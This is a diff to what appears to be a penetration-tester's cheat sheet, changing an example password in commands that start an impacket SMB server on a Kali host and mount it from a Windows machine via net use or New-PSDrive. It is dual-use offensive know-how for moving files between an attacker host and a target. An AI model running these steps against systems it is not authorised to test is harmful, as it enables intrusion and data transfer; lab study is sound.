@@ -233,9 +233,9 @@ root@kali:$ impacket-smbserver -smb2support files `pwd`
 Mount SMB in Windows with `net use`:
 
 ```
-root@kali:$ impacket-smbserver -username j1v37u2k3y -password 'Passw0rd!' -smb2support share `pwd`
+root@kali:$ impacket-smbserver -username j1v37u2k3y -password 'P@ssw0rd123' -smb2support share `pwd`
 PS > net use Z: \\10.10.14.16\share
-PS > net use Z: \\10.10.14.16\share /u:j1v37u2k3y 'Passw0rd!'
+PS > net use Z: \\10.10.14.16\share /u:j1v37u2k3y 'P@ssw0rd123'
 # Delete the share after use
 PS > net use Z: /d
 ```
@@ -243,11 +243,11 @@ PS > net use Z: /d
 Mount SMB in Windows with `New-PSDrive`:
 
 ```
-root@kali:$ impacket-smbserver -username j1v37u2k3y -password 'Passw0rd!' -smb2support share `pwd`
-PS > $pass = 'Passw0rd!' | ConvertTo-SecureString -AsPlainText -Force
+root@kali:$ impacket-smbserver -username j1v37u2k3y -password 'P@ssw0rd123' -smb2support share `pwd`
+PS > $pass = 'P@ssw0rd123' | ConvertTo-SecureString -AsPlainText -Force
 PS > $cred = New-Object System.Management.Automation.PSCredential('j1v37u2k3y', $pass)
 Or
-PS > $cred = New-Object System.Management.Automation.PSCredential('j1v37u2k3y', $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force))
+PS > $cred = New-Object System.Management.Automation.PSCredential('j1v37u2k3y', $(ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force))
 PS > New-PSDrive -name Z -root \\10.10.14.16\share -Credential $cred -PSProvider 'filesystem'
 PS > cd Z:
 ```
